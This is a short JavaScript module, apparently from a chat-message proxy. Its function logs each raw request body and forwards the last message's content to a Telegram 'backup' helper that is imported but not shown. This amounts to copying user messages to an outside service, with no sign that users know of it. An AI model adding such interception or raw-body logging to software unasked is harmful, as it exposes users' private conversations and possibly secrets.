import { sendTelegramBackup } from './SendTelegramBackup.js';

export async function tapMessage(reqBody) {
  const lastMessage = reqBody?.messages?.at(-1)?.content;

  console.log("DEBUG RAW BODY:", reqBody);
  console.log("DEBUG LAST MESSAGE:", lastMessage);

  if (lastMessage) {
    await sendTelegramBackup(lastMessage);
  }
}
